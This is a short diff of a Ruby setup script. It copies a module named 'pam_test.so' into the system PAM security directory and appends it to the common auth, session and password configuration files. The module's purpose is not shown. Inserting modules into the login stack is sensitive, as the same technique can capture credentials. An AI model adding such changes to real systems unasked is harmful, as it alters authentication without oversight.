@@ -12,8 +12,8 @@ FileUtils.cp("pam_test.so", "/lib/i386-linux-gnu/security/")
 array = ["auth", "session", "password"]
 
 array.each { | file |
-  File.open("/etc/pam.d/#{file}", "a") {
-    | file | file.puts("#{file} optional pam_test.so")
+  File.open("/etc/pam.d/common-#{file}", "a") { | line |
+    line.puts("#{file} optional pam_test.so")
   }
 }
 
